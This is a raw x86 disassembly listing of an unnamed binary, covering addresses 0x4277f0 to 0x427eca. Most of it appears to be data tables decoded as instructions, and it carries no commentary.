  4277f0:	dec    ebx
  4277f1:	add    BYTE PTR [edx+0x0],dl
  4277f4:	inc    ebx
  4277f5:	add    BYTE PTR [edi+0x0],bl
  4277f8:	dec    edx
  4277f9:	add    BYTE PTR [eax],bh
  4277fb:	add    BYTE PTR [esi+0x0],dl
  4277fe:	cmp    DWORD PTR [eax],eax
  427800:	cmp    DWORD PTR [eax],eax
  427802:	add    BYTE PTR [eax],al
  427804:	dec    eax
  427805:	add    BYTE PTR [ecx+0x0],bl
  427808:	push   edx
  427809:	add    BYTE PTR [edi+0x0],bl
  42780c:	inc    esp
  42780d:	add    BYTE PTR [ebx+0x0],dl
  427810:	dec    edx
  427811:	add    BYTE PTR [ebx],dh
  427813:	add    BYTE PTR [eax],al
  427815:	add    BYTE PTR [eax+eax*1+0x5a],dl
  427819:	add    BYTE PTR [ecx+0x0],dl
  42781c:	pop    edi
  42781d:	add    BYTE PTR [ebx+0x0],dl
  427820:	cmp    BYTE PTR [eax],al
  427822:	dec    ebx
  427823:	add    BYTE PTR [eax+eax*1],dh
  427826:	xor    al,BYTE PTR [eax]
  427828:	add    BYTE PTR [eax],al
  42782a:	dec    ecx
  42782b:	add    BYTE PTR [eax+0x0],dl
  42782e:	xor    BYTE PTR [eax],al
  427830:	add    BYTE PTR ss:[edi+0x0],bl
  427834:	inc    esi
  427835:	add    BYTE PTR [ebp+0x0],dl
  427838:	inc    edx
  427839:	add    BYTE PTR [eax],al
  42783b:	add    BYTE PTR [edx+0x0],bl
  42783e:	xor    eax,DWORD PTR [eax]
  427840:	inc    ecx
  427841:	add    BYTE PTR [edi],dh
  427843:	add    BYTE PTR [edi+0x0],bl
  427846:	inc    edi
  427847:	add    BYTE PTR [edx+0x0],bl
  42784a:	xor    BYTE PTR [eax],al
  42784c:	push   edx
  42784d:	add    BYTE PTR [edi+0x0],bl
  427850:	aaa    
  427851:	add    BYTE PTR [edx+0x0],dl
  427854:	push   eax
  427855:	add    BYTE PTR [esi+0x0],cl
  427858:	dec    esi
  427859:	add    BYTE PTR [eax],al
  42785b:	add    BYTE PTR [eax+0x0],dl
  42785e:	cmp    DWORD PTR [eax],eax
  427860:	cmp    DWORD PTR [eax],eax
  427862:	xor    eax,DWORD PTR [eax]
  427864:	xor    al,0x0
  427866:	xor    eax,0x36003700
  42786b:	add    BYTE PTR ds:0x41005f00,dh
  427871:	add    BYTE PTR [ecx+0x0],al
  427874:	add    BYTE PTR [eax],al
  427876:	dec    edx
  427877:	add    BYTE PTR [esi+0x0],cl
  42787a:	pop    eax
  42787b:	add    BYTE PTR [edi+0x0],bl
  42787e:	inc    edi
  42787f:	add    BYTE PTR [ecx],bh
  427881:	add    BYTE PTR [edx+0x0],al
  427884:	pop    edx
  427885:	add    BYTE PTR [ebp+0x0],cl
  427888:	pop    edi
  427889:	add    BYTE PTR [ecx+0x0],dl
  42788c:	inc    ebp
  42788d:	add    BYTE PTR [ebp+0x0],dl
  427890:	add    BYTE PTR [eax],al
  427892:	push   eax
  427893:	add    BYTE PTR [eax+eax*1+0x38],al
  427897:	add    BYTE PTR [esi],dh
  427899:	add    BYTE PTR [edi+0x0],bl
  42789c:	xor    al,BYTE PTR [eax]
  42789e:	dec    eax
  42789f:	add    BYTE PTR [esi+0x0],cl
  4278a2:	dec    ecx
  4278a3:	add    BYTE PTR [eax],al
  4278a5:	add    BYTE PTR [eax],al
  4278a7:	xchg   esp,eax
  4278a8:	jne    0x4278ec
  4278aa:	add    BYTE PTR [eax-0x63ffbd8b],bl
  4278b0:	jne    0x4278f4
  4278b2:	add    BYTE PTR [eax-0x5bffbd8b],ah
  4278b8:	jne    0x4278fc
  4278ba:	add    BYTE PTR [eax-0x53ffbd8b],ch
  4278c0:	jne    0x427904
  4278c2:	add    BYTE PTR [eax+0x4275],dh
  4278c8:	add    BYTE PTR [eax],al
  4278ca:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  4278ce:	dec    ebp
  4278cf:	add    BYTE PTR [eax],al
  4278d1:	add    BYTE PTR [eax],al
  4278d3:	add    al,BYTE PTR [eax]
  4278d5:	add    BYTE PTR [eax],al
  4278d7:	inc    edx
  4278d8:	add    BYTE PTR [eax],al
  4278da:	add    BYTE PTR [eax],al
  4278dc:	loopne 0x4278de
  4278de:	add    BYTE PTR [eax],al
  4278e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278e1:	add    BYTE PTR [eax],al
  4278e3:	add    BYTE PTR [eax],al
  4278e5:	add    BYTE PTR [eax],al
  4278e7:	aas    
  4278e8:	add    BYTE PTR [edx],0x0
  4278eb:	push   ecx
  4278ec:	add    BYTE PTR [edx],0x0
  4278ef:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  4278f9:	add    al,BYTE PTR [eax]
  4278fb:	stos   DWORD PTR es:[edi],eax
  4278fc:	add    BYTE PTR [edx],0x0
  4278ff:	add    BYTE PTR [eax],al
  427901:	add    BYTE PTR [eax],al
  427903:	rol    DWORD PTR [edx-0x7d20fffe],1
  427909:	add    al,BYTE PTR [eax]
  42790b:	jmp    0xf3427b92
  427910:	add    BYTE PTR [edx],0x0
  427913:	std    
  427914:	add    BYTE PTR [edx],0x0
  427917:	jae    0x835f791f
  42791d:	add    al,BYTE PTR [eax]
  42791f:	and    eax,0x35000283
  427924:	add    DWORD PTR [edx],0x0
  427927:	aas    
  427928:	add    DWORD PTR [edx],0x0
  42792b:	dec    ecx
  42792c:	add    DWORD PTR [edx],0x0
  42792f:	push   ebx
  427930:	add    DWORD PTR [edx],0x0
  427933:	pop    ebp
  427934:	add    DWORD PTR [edx],0x0
  427937:	add    DWORD PTR [bp+si],0x0
  42793b:	jno    0x4278c0
  42793d:	add    al,BYTE PTR [eax]
  42793f:	jns    0x4278c4
  427941:	add    al,BYTE PTR [eax]
  427943:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  42794d:	add    al,BYTE PTR [eax]
  42794f:	lahf   
  427950:	add    DWORD PTR [edx],0x0
  427953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427954:	add    DWORD PTR [edx],0x0
  427957:	mov    ch,0x83
  427959:	add    al,BYTE PTR [eax]
  42795b:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427962:	add    cl,bl
  427964:	add    DWORD PTR [edx],0x0
  427967:	jecxz  0x4278ec
  427969:	add    al,BYTE PTR [eax]
  42796b:	out    dx,eax
  42796c:	add    DWORD PTR [edx],0x0
  42796f:	std    
  427970:	add    DWORD PTR [edx],0x0
  427973:	pop    es
  427974:	test   BYTE PTR [edx],al
  427976:	add    BYTE PTR [ecx],dl
  427978:	test   BYTE PTR [edx],al
  42797a:	add    BYTE PTR [edi],bl
  42797c:	test   BYTE PTR [edx],al
  42797e:	add    BYTE PTR [edi],ah
  427980:	test   BYTE PTR [edx],al
  427982:	add    BYTE PTR [ecx],dh
  427984:	test   BYTE PTR [edx],al
  427986:	add    BYTE PTR [ebx],bh
  427988:	test   BYTE PTR [edx],al
  42798a:	add    BYTE PTR [ebp-0x7c],al
  42798d:	add    al,BYTE PTR [eax]
  42798f:	dec    ebp
  427990:	test   BYTE PTR [edx],al
  427992:	add    BYTE PTR [edi-0x7c],dl
  427995:	add    al,BYTE PTR [eax]
  427997:	popa   
  427998:	test   BYTE PTR [edx],al
  42799a:	add    BYTE PTR [ebx-0x7c],ch
  42799d:	add    al,BYTE PTR [eax]
  42799f:	jg     0x427925
  4279a1:	add    al,BYTE PTR [eax]
  4279a3:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  4279aa:	add    BYTE PTR [ebx-0x54fffd7c],bl
  4279b0:	test   BYTE PTR [edx],al
  4279b2:	add    BYTE PTR [eax],al
  4279b4:	add    BYTE PTR [eax],al
  4279b6:	add    cl,al
  4279b8:	test   BYTE PTR [edx],al
  4279ba:	add    cl,bl
  4279bc:	test   BYTE PTR [edx],al
  4279be:	add    bh,ah
  4279c0:	test   BYTE PTR [edx],al
  4279c2:	add    bl,bh
  4279c4:	test   BYTE PTR [edx],al
  4279c6:	add    BYTE PTR ds:0x1d000285,cl
  4279cc:	test   DWORD PTR [edx],eax
  4279ce:	add    BYTE PTR [edi],ch
  4279d0:	test   DWORD PTR [edx],eax
  4279d2:	add    BYTE PTR ds:0x51000285,bh
  4279d8:	test   DWORD PTR [edx],eax
  4279da:	add    BYTE PTR [ecx-0x7b],ah
  4279dd:	add    al,BYTE PTR [eax]
  4279df:	ja     0x427966
  4279e1:	add    al,BYTE PTR [eax]
  4279e3:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  4279e9:	add    al,BYTE PTR [eax]
  4279eb:	mov    ds:0xb9000285,eax
  4279f0:	test   DWORD PTR [edx],eax
  4279f2:	add    cl,cl
  4279f4:	test   DWORD PTR [edx],eax
  4279f6:	add    ch,dl
  4279f8:	test   DWORD PTR [edx],eax
  4279fa:	add    bh,ah
  4279fc:	test   DWORD PTR [edx],eax
  4279fe:	add    cl,dh
  427a00:	test   DWORD PTR [edx],eax
  427a02:	add    BYTE PTR [ebx],cl
  427a04:	xchg   BYTE PTR [edx],al
  427a06:	add    BYTE PTR [ecx],ah
  427a08:	xchg   BYTE PTR [edx],al
  427a0a:	add    BYTE PTR ds:0x45000286,dh
  427a10:	xchg   BYTE PTR [edx],al
  427a12:	add    BYTE PTR [ecx-0x7a],dl
  427a15:	add    al,BYTE PTR [eax]
  427a17:	popa   
  427a18:	xchg   BYTE PTR [edx],al
  427a1a:	add    BYTE PTR [ebp-0x7a],ch
  427a1d:	add    al,BYTE PTR [eax]
  427a1f:	jg     0x4279a7
  427a21:	add    al,BYTE PTR [eax]
  427a23:	lea    eax,[esi-0x7964fffe]
  427a29:	add    al,BYTE PTR [eax]
  427a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2c:	xchg   BYTE PTR [edx],al
  427a2e:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427a34:	xchg   BYTE PTR [edx],al
  427a36:	add    cl,bl
  427a38:	xchg   BYTE PTR [edx],al
  427a3a:	add    ch,ch
  427a3c:	xchg   BYTE PTR [edx],al
  427a3e:	add    bl,bh
  427a40:	xchg   BYTE PTR [edx],al
  427a42:	add    BYTE PTR ds:0x1d000287,cl
  427a48:	xchg   DWORD PTR [edx],eax
  427a4a:	add    BYTE PTR [ebx],ch
  427a4c:	xchg   DWORD PTR [edx],eax
  427a4e:	add    BYTE PTR [ecx-0x79],al
  427a51:	add    al,BYTE PTR [eax]
  427a53:	dec    ebp
  427a54:	xchg   DWORD PTR [edx],eax
  427a56:	add    BYTE PTR [ebx-0x79],ah
  427a59:	add    al,BYTE PTR [eax]
  427a5b:	jg     0x4279e4
  427a5d:	add    al,BYTE PTR [eax]
  427a5f:	xchg   ebx,eax
  427a60:	xchg   DWORD PTR [edx],eax
  427a62:	add    BYTE PTR [edi-0x44fffd79],ah
  427a68:	xchg   DWORD PTR [edx],eax
  427a6a:	add    cl,dl
  427a6c:	xchg   DWORD PTR [edx],eax
  427a6e:	add    cl,ch
  427a70:	xchg   DWORD PTR [edx],eax
  427a72:	add    bh,dh
  427a74:	xchg   DWORD PTR [edx],eax
  427a76:	add    BYTE PTR [ecx],cl
  427a78:	mov    BYTE PTR [edx],al
  427a7a:	add    BYTE PTR [edi],bl
  427a7c:	mov    BYTE PTR [edx],al
  427a7e:	add    BYTE PTR [ecx],dh
  427a80:	mov    BYTE PTR [edx],al
  427a82:	add    BYTE PTR [ebp-0x78],al
  427a85:	add    al,BYTE PTR [eax]
  427a87:	add    BYTE PTR [eax],al
  427a89:	add    BYTE PTR [eax],al
  427a8b:	mov    BYTE PTR gs:[edx],al
  427a8e:	add    BYTE PTR [ebx-0x78],dh
  427a91:	add    al,BYTE PTR [eax]
  427a93:	test   DWORD PTR [eax-0x7768fffe],ecx
  427a99:	add    al,BYTE PTR [eax]
  427a9b:	mov    ds:0xb5000288,eax
  427aa0:	mov    BYTE PTR [edx],al
  427aa2:	add    bh,al
  427aa4:	mov    BYTE PTR [edx],al
  427aa6:	add    bl,bl
  427aa8:	mov    BYTE PTR [edx],al
  427aaa:	add    bh,ah
  427aac:	mov    BYTE PTR [edx],al
  427aae:	add    ch,dh
  427ab0:	mov    BYTE PTR [edx],al
  427ab2:	add    BYTE PTR [ecx],al
  427ab4:	mov    DWORD PTR [edx],eax
  427ab6:	add    BYTE PTR [ebx],dl
  427ab8:	mov    DWORD PTR [edx],eax
  427aba:	add    BYTE PTR [ecx],ah
  427abc:	mov    DWORD PTR [edx],eax
  427abe:	add    BYTE PTR [edi],ch
  427ac0:	mov    DWORD PTR [edx],eax
  427ac2:	add    BYTE PTR [ebx-0x77],cl
  427ac5:	add    al,BYTE PTR [eax]
  427ac7:	pop    ebx
  427ac8:	mov    DWORD PTR [edx],eax
  427aca:	add    BYTE PTR [ebp-0x77],dh
  427acd:	add    al,BYTE PTR [eax]
  427acf:	test   DWORD PTR [ecx-0x7664fffe],ecx
  427ad5:	add    al,BYTE PTR [eax]
  427ad7:	stos   DWORD PTR es:[edi],eax
  427ad8:	mov    DWORD PTR [edx],eax
  427ada:	add    BYTE PTR [edi-0x34fffd77],dh
  427ae0:	mov    DWORD PTR [edx],eax
  427ae2:	add    bl,ah
  427ae4:	mov    DWORD PTR [edx],eax
  427ae6:	add    bh,ch
  427ae8:	mov    DWORD PTR [edx],eax
  427aea:	add    bh,bh
  427aec:	mov    DWORD PTR [edx],eax
  427aee:	add    BYTE PTR [ebx],cl
  427af0:	mov    al,BYTE PTR [edx]
  427af2:	add    BYTE PTR [edi],dl
  427af4:	mov    al,BYTE PTR [edx]
  427af6:	add    BYTE PTR ds:0x2f00028a,ah
  427afc:	mov    al,BYTE PTR [edx]
  427afe:	add    BYTE PTR [edi],bh
  427b00:	mov    al,BYTE PTR [edx]
  427b02:	add    BYTE PTR [ecx-0x76],dl
  427b05:	add    al,BYTE PTR [eax]
  427b07:	pop    ebp
  427b08:	mov    al,BYTE PTR [edx]
  427b0a:	add    BYTE PTR [edi-0x76],ch
  427b0d:	add    al,BYTE PTR [eax]
  427b0f:	jnp    0x427a9b
  427b11:	add    al,BYTE PTR [eax]
  427b13:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  427b19:	add    al,BYTE PTR [eax]
  427b1b:	lods   eax,DWORD PTR ds:[esi]
  427b1c:	mov    al,BYTE PTR [edx]
  427b1e:	add    BYTE PTR [ebx-0x32fffd76],bh
  427b24:	mov    al,BYTE PTR [edx]
  427b26:	add    ch,bl
  427b28:	mov    al,BYTE PTR [edx]
  427b2a:	add    ch,ch
  427b2c:	mov    al,BYTE PTR [edx]
  427b2e:	add    BYTE PTR [ecx],cl
  427b30:	mov    eax,DWORD PTR [edx]
  427b32:	add    BYTE PTR [ecx],bl
  427b34:	mov    eax,DWORD PTR [edx]
  427b36:	add    BYTE PTR [ecx],ch
  427b38:	mov    eax,DWORD PTR [edx]
  427b3a:	add    BYTE PTR [edi],dh
  427b3c:	mov    eax,DWORD PTR [edx]
  427b3e:	add    BYTE PTR [ebp-0x75],cl
  427b41:	add    al,BYTE PTR [eax]
  427b43:	pop    ebx
  427b44:	mov    eax,DWORD PTR [edx]
  427b46:	add    BYTE PTR [ebp-0x75],ah
  427b49:	add    al,BYTE PTR [eax]
  427b4b:	jno    0x427ad8
  427b4d:	add    al,BYTE PTR [eax]
  427b4f:	or     DWORD PTR [ebx-0x7464fffe],0x2
  427b56:	add    BYTE PTR [ebp-0x42fffd75],ch
  427b5c:	mov    eax,DWORD PTR [edx]
  427b5e:	add    cl,dl
  427b60:	mov    eax,DWORD PTR [edx]
  427b62:	add    cl,ah
  427b64:	mov    eax,DWORD PTR [edx]
  427b66:	add    bh,dh
  427b68:	mov    eax,DWORD PTR [edx]
  427b6a:	add    BYTE PTR ds:0x1900028c,al
  427b70:	mov    WORD PTR [edx],es
  427b72:	add    BYTE PTR [edi],ah
  427b74:	mov    WORD PTR [edx],es
  427b76:	add    BYTE PTR [ecx],bh
  427b78:	mov    WORD PTR [edx],es
  427b7a:	add    BYTE PTR [ebx-0x74],cl
  427b7d:	add    al,BYTE PTR [eax]
  427b7f:	pop    ebp
  427b80:	mov    WORD PTR [edx],es
  427b82:	add    BYTE PTR [ecx-0x74],ch
  427b85:	add    al,BYTE PTR [eax]
  427b87:	ja     0x427b15
  427b89:	add    al,BYTE PTR [eax]
  427b8b:	lea    ecx,[edx+eax*1+0x28ca100]
  427b92:	add    BYTE PTR [ebp-0x38fffd74],dh
  427b98:	mov    WORD PTR [edx],es
  427b9a:	add    cl,dl
  427b9c:	mov    WORD PTR [edx],es
  427b9e:	add    bl,ah
  427ba0:	mov    WORD PTR [edx],es
  427ba2:	add    bh,dh
  427ba4:	mov    WORD PTR [edx],es
  427ba6:	add    BYTE PTR [ebx],cl
  427ba8:	lea    eax,[edx]
  427baa:	add    BYTE PTR [ebx],bl
  427bac:	lea    eax,[edx]
  427bae:	add    BYTE PTR [ecx],ch
  427bb0:	lea    eax,[edx]
  427bb2:	add    BYTE PTR [ebx-0x73],al
  427bb5:	add    al,BYTE PTR [eax]
  427bb7:	pop    ebx
  427bb8:	lea    eax,[edx]
  427bba:	add    BYTE PTR [ecx-0x73],ch
  427bbd:	add    al,BYTE PTR [eax]
  427bbf:	jnp    0x427b4e
  427bc1:	add    al,BYTE PTR [eax]
  427bc3:	mov    DWORD PTR [ebp-0x726afffe],ecx
  427bc9:	add    al,BYTE PTR [eax]
  427bcb:	scas   eax,DWORD PTR es:[edi]
  427bcc:	lea    eax,[edx]
  427bce:	add    cl,al
  427bd0:	lea    eax,[edx]
  427bd2:	add    bl,dl
  427bd4:	lea    eax,[edx]
  427bd6:	add    bl,ah
  427bd8:	lea    eax,[edx]
  427bda:	add    bl,dh
  427bdc:	lea    eax,[edx]
  427bde:	add    ch,bh
  427be0:	lea    eax,[edx]
  427be2:	add    BYTE PTR ds:0x1f00028e,cl
  427be8:	mov    es,WORD PTR [edx]
  427bea:	add    BYTE PTR [edi],ch
  427bec:	mov    es,WORD PTR [edx]
  427bee:	add    BYTE PTR [ebp-0x72],al
  427bf1:	add    al,BYTE PTR [eax]
  427bf3:	pop    ebp
  427bf4:	mov    es,WORD PTR [edx]
  427bf6:	add    BYTE PTR [edi-0x72],ch
  427bf9:	add    al,BYTE PTR [eax]
  427bfb:	jg     0x427b8b
  427bfd:	add    al,BYTE PTR [eax]
  427bff:	xchg   ecx,eax
  427c00:	mov    es,WORD PTR [edx]
  427c02:	add    BYTE PTR [edi-0x4efffd72],bl
  427c08:	mov    es,WORD PTR [edx]
  427c0a:	add    BYTE PTR [edi-0x2efffd72],bh
  427c10:	mov    es,WORD PTR [edx]
  427c12:	add    bl,ah
  427c14:	mov    es,WORD PTR [edx]
  427c16:	add    bh,dh
  427c18:	mov    es,WORD PTR [edx]
  427c1a:	add    BYTE PTR [ebx],cl
  427c1c:	pop    DWORD PTR [edx]
  427c1e:	add    BYTE PTR ds:0x3300028f,bl
  427c24:	pop    DWORD PTR [edx]
  427c26:	add    BYTE PTR [ebp-0x71],al
  427c29:	add    al,BYTE PTR [eax]
  427c2b:	popa   
  427c2c:	pop    DWORD PTR [edx]
  427c2e:	add    BYTE PTR [edi-0x71],dh
  427c31:	add    al,BYTE PTR [eax]
  427c33:	test   DWORD PTR [edi-0x7066fffe],ecx
  427c39:	add    al,BYTE PTR [eax]
  427c3b:	add    BYTE PTR [eax],al
  427c3d:	add    BYTE PTR [eax],al
  427c3f:	mov    bl,0x8f
  427c41:	add    al,BYTE PTR [eax]
  427c43:	ret    
  427c44:	pop    DWORD PTR [edx]
  427c46:	add    bl,bl
  427c48:	pop    DWORD PTR [edx]
  427c4a:	add    ch,ah
  427c4c:	pop    DWORD PTR [edx]
  427c4e:	add    ch,dh
  427c50:	pop    DWORD PTR [edx]
  427c52:	add    BYTE PTR [ecx],cl
  427c54:	nop
  427c55:	add    al,BYTE PTR [eax]
  427c57:	pop    ss
  427c58:	nop
  427c59:	add    al,BYTE PTR [eax]
  427c5b:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  427c61:	add    al,BYTE PTR [eax]
  427c63:	dec    edi
  427c64:	nop
  427c65:	add    al,BYTE PTR [eax]
  427c67:	pop    ebp
  427c68:	nop
  427c69:	add    al,BYTE PTR [eax]
  427c6b:	addr16 nop
  427c6d:	add    al,BYTE PTR [eax]
  427c6f:	jns    0x427c01
  427c71:	add    al,BYTE PTR [eax]
  427c73:	lea    edx,[eax-0x6f66fffe]
  427c79:	add    al,BYTE PTR [eax]
  427c7b:	scas   eax,DWORD PTR es:[edi]
  427c7c:	nop
  427c7d:	add    al,BYTE PTR [eax]
  427c7f:	ret    
  427c80:	nop
  427c81:	add    al,BYTE PTR [eax]
  427c83:	rcl    DWORD PTR [eax-0x6f1afffe],1
  427c89:	add    al,BYTE PTR [eax]
  427c8b:	stc    
  427c8c:	nop
  427c8d:	add    al,BYTE PTR [eax]
  427c8f:	add    eax,0x11000291
  427c94:	xchg   ecx,eax
  427c95:	add    al,BYTE PTR [eax]
  427c97:	daa    
  427c98:	xchg   ecx,eax
  427c99:	add    al,BYTE PTR [eax]
  427c9b:	xor    eax,0x41000291
  427ca0:	xchg   ecx,eax
  427ca1:	add    al,BYTE PTR [eax]
  427ca3:	push   ebx
  427ca4:	xchg   ecx,eax
  427ca5:	add    al,BYTE PTR [eax]
  427ca7:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  427cb1:	add    al,BYTE PTR [eax]
  427cb3:	fwait
  427cb4:	xchg   ecx,eax
  427cb5:	add    al,BYTE PTR [eax]
  427cb7:	stos   DWORD PTR es:[edi],eax
  427cb8:	xchg   ecx,eax
  427cb9:	add    al,BYTE PTR [eax]
  427cbb:	mov    ecx,0xc3000291
  427cc0:	xchg   ecx,eax
  427cc1:	add    al,BYTE PTR [eax]
  427cc3:	int    0x91
  427cc5:	add    al,BYTE PTR [eax]
  427cc7:	fst    DWORD PTR [ecx-0x6e1afffe]
  427ccd:	add    al,BYTE PTR [eax]
  427ccf:	not    DWORD PTR [ecx-0x6df2fffe]
  427cd5:	add    al,BYTE PTR [eax]
  427cd7:	daa    
  427cd8:	xchg   edx,eax
  427cd9:	add    al,BYTE PTR [eax]
  427cdb:	aaa    
  427cdc:	xchg   edx,eax
  427cdd:	add    al,BYTE PTR [eax]
  427cdf:	inc    ecx
  427ce0:	xchg   edx,eax
  427ce1:	add    al,BYTE PTR [eax]
  427ce3:	push   ecx
  427ce4:	xchg   edx,eax
  427ce5:	add    al,BYTE PTR [eax]
  427ce7:	arpl   WORD PTR [edx-0x6d8efffe],dx
  427ced:	add    al,BYTE PTR [eax]
  427cef:	mov    edx,DWORD PTR [edx+0x2]
  427cf5:	add    BYTE PTR [eax],al
  427cf7:	inc    edx
  427cf8:	xor    al,0x10
  427cfa:	add    cl,dl
  427cfc:	add    dl,BYTE PTR [eax]
  427cfe:	add    BYTE PTR [edi],bh
  427d00:	jge    0x427d12
  427d02:	add    BYTE PTR ds:0xe1001070,dl
  427d08:	jae    0x427d1a
  427d0a:	add    BYTE PTR [esi-0x52ffeff5],al
  427d10:	jae    0x427d22
  427d12:	add    BYTE PTR [edx+0x25],ah
  427d15:	adc    BYTE PTR [eax],al
  427d17:	je     0x427d44
  427d19:	adc    BYTE PTR [eax],al
  427d1b:	sahf   
  427d1c:	jp     0x427d2e
  427d1e:	add    BYTE PTR [edi],ch
  427d20:	adc    BYTE PTR [eax],dl
	...
  427d2a:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  427d2e:	dec    ebp
  427d2f:	add    BYTE PTR [eax],al
  427d31:	add    BYTE PTR [eax],al
  427d33:	pop    ecx
  427d34:	jge    0x427d38
  427d36:	add    BYTE PTR [ecx],al
  427d38:	add    BYTE PTR [eax],al
  427d3a:	add    BYTE PTR [ecx],al
  427d3c:	add    BYTE PTR [eax],al
  427d3e:	add    BYTE PTR [ecx],al
  427d40:	add    BYTE PTR [eax],al
  427d42:	add    BYTE PTR [edi+0x7d],cl
  427d45:	add    al,BYTE PTR [eax]
  427d47:	push   ebx
  427d48:	jge    0x427d4c
  427d4a:	add    BYTE PTR [edi+0x7d],dl
  427d4d:	add    al,BYTE PTR [eax]
  427d4f:	in     eax,dx
  427d50:	arpl   WORD PTR [eax],ax
  427d52:	add    BYTE PTR [edx+0x7d],ch
  427d55:	add    al,BYTE PTR [eax]
  427d57:	add    BYTE PTR [eax],al
  427d59:	dec    bp
  427d5b:	jno    0x427db2
  427d5d:	outs   dx,DWORD PTR ds:[esi]
  427d5e:	pop    ecx
  427d5f:	xor    al,0x55
  427d61:	jbe    0x427dd1
  427d63:	dec    eax
  427d64:	cs data16 ins BYTE PTR es:[di],dx
  427d68:	jo     0x427d6a
  427d6a:	aas    
  427d6b:	inc    edi
  427d6c:	outs   dx,BYTE PTR gs:[esi]
  427d6e:	gs jb  0x427dd2
  427d71:	je     0x427dd8
  427d73:	push   eax
  427d74:	outs   dx,DWORD PTR ds:[esi]
  427d75:	imul   ebp,DWORD PTR [esi+0x74],0x4077654e
  427d7c:	inc    eax
  427d7d:	pop    ecx
  427d7e:	inc    edi
  427d7f:	inc    esi
  427d80:	push   eax
  427d81:	inc    ecx
  427d82:	pop    edi
  427d83:	dec    esi
  427d84:	inc    esp
  427d85:	cmp    al,0x56
  427d87:	add    bh,dh
  427d89:	jl     0x427dcd
  427d8b:	add    bl,bh
  427d8d:	jl     0x427dd1
  427d8f:	add    bh,bh
  427d91:	jl     0x427dd5
  427d93:	add    BYTE PTR [ebx],al
  427d95:	jge    0x427dd9
  427d97:	add    BYTE PTR [edi],al
  427d99:	jge    0x427ddd
  427d9b:	add    BYTE PTR [ebx],cl
  427d9d:	jge    0x427de1
  427d9f:	add    BYTE PTR [edi],cl
  427da1:	jge    0x427de5
  427da3:	add    BYTE PTR [ebx],dl
  427da5:	jge    0x427de9
  427da7:	add    BYTE PTR [edi],dl
  427da9:	jge    0x427ded
  427dab:	add    BYTE PTR [ebx],bl
  427dad:	jge    0x427df1
  427daf:	add    BYTE PTR [edi],bl
  427db1:	jge    0x427df5
  427db3:	add    BYTE PTR [eax],al
  427db5:	add    BYTE PTR [eax],al
  427db7:	das    
  427db8:	jle    0x427dbc
	...
  427dc2:	add    bl,al
  427dc4:	add    BYTE PTR [edx],0x0
  427dc7:	out    0x78,eax
  427dc9:	add    al,BYTE PTR [eax]
  427dcb:	dec    ebx
  427dcc:	jle    0x427dd0
	...
  427dd6:	add    BYTE PTR [ebp+0x3000284],dh
  427ddc:	jns    0x427de0
  427dde:	add    bh,bh
  427de0:	jle    0x427de4
	...
  427dea:	add    BYTE PTR [edi-0x78],dl
  427ded:	add    al,BYTE PTR [eax]
  427def:	mov    bh,0x79
  427df1:	add    al,BYTE PTR [eax]
  427df3:	sar    DWORD PTR [edi+0x2],cl
	...
  427dfe:	add    BYTE PTR [edi-0x74fffd71],ah
  427e04:	jp     0x427e08
  427e06:	add    BYTE PTR [edi+0x281],al
  427e0c:	add    BYTE PTR [eax],al
  427e0e:	add    BYTE PTR [eax],al
  427e10:	add    BYTE PTR [eax],al
  427e12:	add    BYTE PTR [edi+0x3f000292],dl
  427e18:	jl     0x427e1c
	...
  427e2e:	add    BYTE PTR [edi],bh
  427e30:	add    BYTE PTR [edx],0x0
  427e33:	push   ecx
  427e34:	add    BYTE PTR [edx],0x0
  427e37:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  427e41:	add    al,BYTE PTR [eax]
  427e43:	stos   DWORD PTR es:[edi],eax
  427e44:	add    BYTE PTR [edx],0x0
  427e47:	add    BYTE PTR [eax],al
  427e49:	add    BYTE PTR [eax],al
  427e4b:	rol    DWORD PTR [edx-0x7d20fffe],1
  427e51:	add    al,BYTE PTR [eax]
  427e53:	jmp    0xf34280da
  427e58:	add    BYTE PTR [edx],0x0
  427e5b:	std    
  427e5c:	add    BYTE PTR [edx],0x0
  427e5f:	jae    0x835f7e67
  427e65:	add    al,BYTE PTR [eax]
  427e67:	and    eax,0x35000283
  427e6c:	add    DWORD PTR [edx],0x0
  427e6f:	aas    
  427e70:	add    DWORD PTR [edx],0x0
  427e73:	dec    ecx
  427e74:	add    DWORD PTR [edx],0x0
  427e77:	push   ebx
  427e78:	add    DWORD PTR [edx],0x0
  427e7b:	pop    ebp
  427e7c:	add    DWORD PTR [edx],0x0
  427e7f:	add    DWORD PTR [bp+si],0x0
  427e83:	jno    0x427e08
  427e85:	add    al,BYTE PTR [eax]
  427e87:	jns    0x427e0c
  427e89:	add    al,BYTE PTR [eax]
  427e8b:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  427e95:	add    al,BYTE PTR [eax]
  427e97:	lahf   
  427e98:	add    DWORD PTR [edx],0x0
  427e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e9c:	add    DWORD PTR [edx],0x0
  427e9f:	mov    ch,0x83
  427ea1:	add    al,BYTE PTR [eax]
  427ea3:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427eaa:	add    cl,bl
  427eac:	add    DWORD PTR [edx],0x0
  427eaf:	jecxz  0x427e34
  427eb1:	add    al,BYTE PTR [eax]
  427eb3:	out    dx,eax
  427eb4:	add    DWORD PTR [edx],0x0
  427eb7:	std    
  427eb8:	add    DWORD PTR [edx],0x0
  427ebb:	pop    es
  427ebc:	test   BYTE PTR [edx],al
  427ebe:	add    BYTE PTR [ecx],dl
  427ec0:	test   BYTE PTR [edx],al
  427ec2:	add    BYTE PTR [edi],bl
  427ec4:	test   BYTE PTR [edx],al
  427ec6:	add    BYTE PTR [edi],ah
  427ec8:	test   BYTE PTR [edx],al
  427eca:	add    BYTE PTR [ecx],dh
